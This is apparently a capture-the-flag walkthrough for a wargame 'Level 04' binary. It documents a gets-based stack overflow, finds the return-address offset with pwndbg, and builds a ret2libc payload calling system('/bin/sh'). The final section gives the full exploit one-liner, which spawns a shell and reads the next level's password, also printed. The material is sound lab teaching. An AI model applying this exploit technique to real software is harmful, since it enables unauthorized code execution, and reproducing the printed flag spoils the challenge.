# Walkthrough for Level 04

The binary is vulnerable to a buffer overflow attack because it uses the unsafe `gets` function to copy user input into
a fixed-size buffer without checking the input length. This allows us to overwrite adjacent memory, redirecting the
program's control flow to execute arbitrary code.

## Debugging the Binary

We run the binary within `gdb` and set the `follow-fork-mode` to `child` because the binary creates a child process
using `fork`.

```shell
└─$ gdb ./level04
...SNIP...
pwndbg> set follow-fork-mode child
```

## Calculating the offset

To find the offset at which the buffer overflow occurs, we use a 180 characters long cyclic pattern. In this case,
we use [pwndbg](https://github.com/pwndbg/pwndbg). The EIP (Extended Instruction Pointer) register is overwritten with
`0x6261616f`, which corresponds to the string `oaab`, part of our cyclic pattern. We find the offset of this string in
the cyclic pattern using the `cyclic -l` command. The offset is `156` bytes, which means that at this point in the input,
we manage to overwrite the EIP register redirecting the program's control flow to an arbitrary address.

```shell
└─$ gdb ./level04
...SNIP...
pwndbg> set follow-fork-mode child
pwndbg> cyclic 180
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaab
pwndbg> run
...SNIP...
Give me some shellcode, k
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaab

Thread 8.1 "level04" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0xf7fc04c0 (LWP 42627)]
0x6261616f in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
...SNIP...
 EIP  0x6261616f ('oaab')
───────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────
Invalid address 0x6261616f
...SNIP...

pwndbg> cyclic -l oaab
Finding cyclic pattern of 4 bytes: b'oaab' (hex: 0x6f616162)
Found at offset 156
```

## Crafting the Exploit

To exploit the vulnerability, we will overwrite the return address of the function with the address of `system` in the
libc library. We will also provide the address of the string `/bin/sh` as an argument to `system` to spawn a shell.
We chose to use `system` because the binary prevents the use of the `execve` syscall.

### Finding the Addresses

#### System() address

```shell
(gdb) p system 
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```
In little endian: `\xd0\xae\xe6\xf7`

#### "/bin/sh" string address

The string `/bin/sh` is commonly found in the libc library so first, we need to find the memory mappings of the process
to locate the libc library to be able to search for the string.

```shell
(gdb) info proc mappings
process 1733
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
...SNIP...
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
...SNIP...
```
We can see that the libc library is loaded at the address range `0xf7e2c000` to `0xf7fd0000`. We can search for the
string `/bin/sh` within this range to find its address.

```shell
(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
```
In little endian: `\xec\x97\xf8\xf7`

## Creating the Payload

We will create a payload that consists of:
- 156 bytes of padding (to reach the return address)
- The address of `system` in little-endian format
- The return address to which the program will jump at the end of `system` function execution (can be any value; here,
- we use `4242`)
- The address of the string `/bin/sh` in little-endian format

## Running the Exploit

```shell
$ (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "4242" + "\xec\x97\xf8\xf7"'; cat) | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```